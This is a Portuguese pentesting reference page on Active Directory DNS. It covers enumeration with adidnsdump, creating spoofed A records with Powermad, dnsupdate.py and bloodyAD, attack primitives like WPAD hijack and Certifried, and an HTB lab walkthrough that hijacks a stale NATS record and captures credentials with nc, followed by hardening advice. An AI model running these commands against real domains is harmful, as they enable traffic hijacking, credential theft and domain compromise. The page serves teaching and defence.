# Registros DNS do AD

{{#include ../../banners/hacktricks-training.md}}

Por padrão, **qualquer usuário** no Active Directory pode **enumerar todos os registros DNS** nas zonas DNS do Domain ou Forest, de forma semelhante a uma zone transfer (os usuários podem listar os objetos filhos de uma zona DNS em um ambiente AD).

A ferramenta [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) permite **enumerar** e **exportar** **todos os registros DNS** da zona para fins de reconhecimento de redes internas.<sup>[[4]](#references)</sup>

```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```

>  adidnsdump v1.4.0 (abril de 2025) adiciona saída JSON/Greppable (`--json`), resolução DNS multithread e suporte a TLS 1.2/1.3 ao se conectar ao LDAPS  

Para mais informações, leia [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>

---

## Criando / Modificando registros (spoofing de ADIDNS)

Como o grupo **Authenticated Users** tem, por padrão, permissão **Create Child** na DACL da zona, qualquer conta de domínio (ou conta de computador) pode registrar registros adicionais. Isso pode ser usado para sequestrar tráfego, forçar NTLM relay ou até mesmo comprometer todo o domínio.

### PowerMad / Invoke-DNSUpdate (PowerShell)

```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```

### Impacket – dnsupdate.py  (Python)

```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```

*(dnsupdate.py vem incluído no Impacket ≥0.12.0)*

### BloodyAD

```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```

---

## Primitivas de ataque comuns

1. **Registro curinga** – `*.<zone>` transforma o servidor DNS do AD em um respondedor para toda a empresa, semelhante a um spoofing de LLMNR/NBNS. Pode ser abusado para capturar hashes NTLM ou retransmiti-los para LDAP/SMB.  (Requer que WINS-lookup esteja desabilitado.)<sup>[[1]](#references)</sup>    
2. **WPAD hijack** – adicione `wpad` (ou um registro **NS** apontando para um host do atacante para contornar a Global-Query-Block-List) e faça proxy transparente das solicitações HTTP de saída para coletar credenciais. A Microsoft corrigiu os bypasses de wildcard/DNAME (CVE-2018-8320), mas os **registros NS ainda funcionam**.<sup>[[1]](#references)</sup>    
3. **Sequestro de entrada obsoleta** – reivindique o endereço IP que pertencia anteriormente a uma estação de trabalho; a entrada DNS associada continuará resolvendo, permitindo ataques de resource-based constrained delegation ou Shadow-Credentials sem tocar no DNS.    
4. **DHCP → DNS spoofing** – em uma implantação padrão de Windows DHCP+DNS, um atacante não autenticado na mesma sub-rede pode sobrescrever qualquer registro A existente (inclusive de Domain Controllers) enviando solicitações DHCP forjadas que acionam atualizações dinâmicas de DNS (Akamai “DDSpoof”, 2023). Isso permite machine-in-the-middle sobre Kerberos/LDAP e pode levar à tomada completa do domínio.<sup>[[2]](#references)</sup>    
5. **Certifried (CVE-2022-26923)** – altere o `dNSHostName` de uma conta de máquina que você controla, registre um registro A correspondente e solicite um certificado para esse nome para se passar pelo DC. Ferramentas como **Certipy** ou **BloodyAD** automatizam totalmente o fluxo.  

Um registro DNS do AD com [informações de destino serializadas](../ntlm/README.md#ntlm--kerberos-reflection-via-serialized-spns-cve-2025-33073) pode fazer parte de uma cadeia de relay condicional: o chamador precisa de permissões para criar registros, de um caminho de coerção que faça o computador de destino se autenticar nesse nome e de um destino de relay que aceite a autenticação resultante. Avalie o protocolo de destino separadamente; a assinatura SMB na conexão de entrada não determina, por si só, se um destino HTTPS WinRM aceita o relay. O nível de patch, o tratamento de nomes, o Extended Protection e a configuração do serviço podem alterar o resultado.

---

### Sequestro de serviço interno por meio de registros dinâmicos obsoletos (estudo de caso do NATS)

Quando as atualizações dinâmicas permanecem abertas a todos os usuários autenticados, **um nome de serviço removido do registro pode ser reivindicado novamente e apontado para uma infraestrutura controlada pelo atacante**. O DC Mirage HTB expôs o hostname `nats-svc.mirage.htb` após o DNS scavenging, permitindo que qualquer usuário com poucos privilégios pudesse:<sup>[[3]](#references)</sup>

1. **Confirme que o registro está ausente** e descubra o SOA com `dig`:

```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```

2. **Recrie o registro** apontando para uma interface externa/VPN sob controle deles:

```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```

3. **Impersonar o serviço em texto simples**. Os clientes NATS esperam receber um banner `INFO { ... }` antes de enviar credenciais, então basta copiar um banner legítimo do broker real para coletar segredos:

```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```

Qualquer cliente que resolva o nome sequestrado fará imediatamente o leak do seu frame JSON `CONNECT` (incluindo `"user"`/`"pass"`) para o listener. Executar o binário oficial `nats-server -V` no host do atacante, desativar a redação dos logs ou simplesmente farejar a sessão com o Wireshark revela as mesmas credenciais em texto simples, pois o TLS era opcional.

4. **Pivot com as creds capturadas** – no Mirage, a conta NATS roubada forneceu acesso ao JetStream, que expôs eventos históricos de autenticação contendo nomes de usuário/senhas reutilizáveis do AD.

Esse padrão se aplica a todo serviço integrado ao AD que dependa de handshakes TCP não seguros (APIs HTTP, RPC, MQTT etc.): assim que o registro DNS é sequestrado, o atacante se torna o serviço.

---

## Detecção e hardening

* Negue a **Authenticated Users** o direito *Create all child objects* em zonas sensíveis e delegue as atualizações dinâmicas a uma conta dedicada usada pelo DHCP.
* Se as atualizações dinâmicas forem necessárias, defina a zona como **Secure-only** e habilite **Name Protection** no DHCP para que somente o objeto de computador proprietário possa sobrescrever seu próprio registro.
* Monitore os IDs de evento 257/252 do DNS Server (atualização dinâmica), 770 (transferência de zona) e gravações LDAP em `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Bloqueie nomes perigosos (`wpad`, `isatap`, `*`) com um registro intencionalmente benigno ou por meio da Global Query Block List.
* Mantenha os servidores DNS corrigidos – por exemplo, bugs de RCE CVE-2024-26224 e CVE-2024-26231 chegaram a **CVSS 9.8** e podem ser explorados remotamente contra Domain Controllers.

## References

- [1] [ADIDNS revisitado - WPAD, GQBL e mais](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, still the de-facto reference for wildcard/WPAD attacks)
- [2] [Falsificando registros DNS ao abusar das atualizações dinâmicas de DNS do DHCP](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (Dec 2023)
- [3] [HackTheBox Mirage: Encadeando NFS Leaks, abuso de DNS dinâmico, roubo de credenciais NATS, segredos do JetStream e Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [4] [Entrando na zona: despejando DNS do Active Directory usando adidnsdump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
{{#include ../../banners/hacktricks-training.md}}
